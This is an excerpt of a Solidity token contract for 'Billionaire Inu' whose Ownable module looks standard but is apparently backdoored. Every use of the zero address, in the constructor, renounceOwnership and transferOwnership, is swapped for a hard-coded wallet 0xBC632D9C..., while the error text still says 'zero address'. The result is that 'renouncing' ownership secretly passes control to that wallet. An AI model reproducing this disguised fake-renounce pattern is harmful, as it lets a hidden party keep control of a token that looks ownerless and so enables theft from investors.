...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        emit OwnershipTransferred(address(0xBC632D9CbCe27758c8bc8c0eF7E0e040ff0DE36D), _owner);
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xBC632D9CbCe27758c8bc8c0eF7E0e040ff0DE36D));
        _owner = address(0xBC632D9CbCe27758c8bc8c0eF7E0e040ff0DE36D);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0xBC632D9CbCe27758c8bc8c0eF7E0e040ff0DE36D), "Ownable: new owner is the zero address");
...
contract BI is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0x582d34CEf6D0D2e4Ae2624590e6dB49c8582268e;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "Billionaire Inu";
